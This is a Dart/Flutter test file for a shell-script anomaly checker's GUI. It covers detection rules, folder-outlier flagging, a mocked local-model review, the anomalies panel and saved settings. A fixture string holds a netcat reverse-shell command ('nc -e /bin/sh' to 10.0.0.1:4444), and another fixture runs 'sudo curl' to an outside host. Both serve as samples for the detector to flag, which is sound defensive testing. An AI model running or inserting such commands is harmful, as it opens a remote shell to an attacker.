import 'dart:convert';
import 'dart:io';

import 'package:check_script/check_script.dart';
import 'package:check_script_gui/app_state.dart';
import 'package:check_script_gui/widgets/anomalies_panel.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:material_ui/material_ui.dart' hide Baseline;
import 'package:shared_preferences/shared_preferences.dart';

import 'features_test.dart' show NoTools;

const _shell = '#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\n';

void main() {
  late Directory tmp;
  setUp(() async {
    SharedPreferences.setMockInitialValues({});
    tmp = await Directory.systemTemp.createTemp('cs_gan_');
  });
  tearDown(() => tmp.delete(recursive: true));

  String write(String name, String content) =>
      (File('${tmp.path}/$name')..writeAsStringSync(content)).path;

  AppState newState({bool anomalies = true, ModelTransport? transport}) =>
      AppState(
          runner: NoTools(),
          modelTransport: transport,
          settings: GuiSettings(lang: Lang.fr, anomalies: anomalies));

  List<String> idsOf(ScriptReport? r) => [for (final a in r!.anomalies!) a.id];

  testWidgets('analyse : anomalies présentes, absentes si désactivées',
      (tester) async {
    final f = write('a.sh', _shell);
    final on = newState();
    await tester.runAsync(() => on.analyzeFile(f));
    expect(idsOf(on.current), contains('AB005'));
    final off = newState(anomalies: false);
    await tester.runAsync(() => off.analyzeFile(f));
    expect(off.current!.anomalies, isNull);
  });

  testWidgets('dossier : écarts au parc, conservés à l\'ouverture du script',
      (tester) async {
    for (var i = 0; i < 5; i++) {
      write('ok$i.sh', '#!/bin/sh\necho ok\n');
    }
    final odd = write('odd.sh', '#!/bin/sh\nsudo curl https://rare.net/x\n');
    final state = newState();
    await tester.runAsync(() => state.analyzeFolder(tmp.path));
    final inFolder =
        state.folderReports.firstWhere((r) => r.script.path == odd);
    expect(idsOf(inFolder), contains('AF001'));
    await tester.runAsync(() => state.analyzeFile(odd));
    expect(idsOf(state.current), contains('AF001'));
  });

  testWidgets('relecture à la demande : suggestions ajoutées une fois',
      (tester) async {
    final bodies = <String>[];
    final state = newState(transport: (url, body, timeout) async {
      bodies.add(body);
      return jsonEncode({
        'response': jsonEncode({
          'anomalies': [
            {'line': 2, 'level': 'high', 'title': 'Suggestion X'}
          ]
        })
      });
    });
    final f = write('a.sh', _shell);
    await tester.runAsync(() async {
      await state.analyzeFile(f);
      await state.reviewWithModel();
      await state.reviewWithModel();
    });
    expect(idsOf(state.current).where((i) => i == 'AI001'), hasLength(1));
    expect(idsOf(state.current), contains('AB005'));
    expect(state.current!.aiNote, contains('à vérifier'));
    expect(state.reviewing, isNull);
    expect(bodies, hasLength(2));
  });

  testWidgets('panneau : constats, lignes cliquables, bouton', (tester) async {
    tester.view.physicalSize = const Size(900, 1200);
    tester.view.devicePixelRatio = 1;
    addTearDown(tester.view.reset);
    final state = newState();
    final f = write('a.sh', _shell);
    await tester.runAsync(() => state.analyzeFile(f));
    int? line;
    await tester.pumpWidget(MaterialApp(
        home: Scaffold(
            body: AnomaliesPanel(
                state: state,
                report: state.current!,
                onSelectLine: (l) => line = l))));
    await tester.pumpAndSettle();
    expect(find.textContaining('AB005'), findsOneWidget);
    expect(find.text('Relire avec le modèle local'), findsOneWidget);
    await tester.tap(find.text('L2'));
    expect(line, 2);
  });

  test('réglages enregistrés puis relus', () async {
    await const GuiSettings()
        .copyWith(anomalies: false, aiModel: 'm:1', aiFast: true)
        .save();
    final s = await GuiSettings.load();
    expect((s.anomalies, s.aiModel, s.aiFast), (false, 'm:1', true));
  });
}
